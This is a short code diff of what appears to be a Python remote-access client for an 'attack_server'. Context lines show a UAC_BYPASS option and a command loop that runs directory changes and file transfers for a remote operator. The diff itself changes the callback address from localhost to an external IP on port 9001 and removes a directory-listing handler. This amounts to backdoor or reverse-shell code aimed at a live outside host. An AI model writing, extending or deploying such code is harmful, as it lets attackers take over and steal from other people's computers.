@@ -97,7 +97,7 @@ if(UAC_BYPASS):
 
 port = 9001 #port of attack_server
 #host_addr = "175.192.214.36" #address of attack_server
-host_addr = "127.0.0.1" 
+host_addr = "175.192.214.36" 
 debug_print("client start...")
 
 
@@ -123,9 +123,6 @@ while True:
                     os.chdir(str(server_cmd[3:]))
                     output=os.getcwd()
                     send_s(conn,output)
-                elif(server_cmd[:2]=="ls"): # alter mojibake hangul
-                    dir_list=os.listdir(os.getcwd())
-                    send_s(conn,'\n'.join(dir_list))
                 elif(server_cmd[:2]=="ft"):
                     if(file_transfer_mode(conn)==0):
                         continue
